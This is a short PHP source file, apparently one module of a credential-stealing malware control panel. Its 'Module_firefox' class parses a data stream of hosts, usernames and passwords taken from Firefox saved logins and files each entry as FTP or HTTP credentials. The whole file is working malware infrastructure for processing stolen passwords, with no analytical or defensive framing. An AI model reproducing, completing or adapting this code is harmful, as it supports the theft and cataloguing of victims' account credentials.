<?php
class Module_firefox extends Module_
{
    function ProcessBrowserStream($Source, $QUP_ = FALSE)
    {
        $stream = new Stream($Source);
        while(TRUE)
        {
            $Host	= $stream->getSTRING_();
            if($Host == NULL)
                break;

            $User 	= $stream->getSTRING_();
            $Pass	= $stream->getSTRING_();

            if($QUP_)
                $Host = urldecode ( $Host );
			
            if (str_begins($Host, 'ftp://'))
                $this->add_ftp($Host, $User, $Pass);
            else
                $this->add_http($Host, $User, $Pass);
        }
        $stream = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessBrowserStream($Data);
            break;
        case 1:
            $this->ProcessBrowserStream($Data, TRUE);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
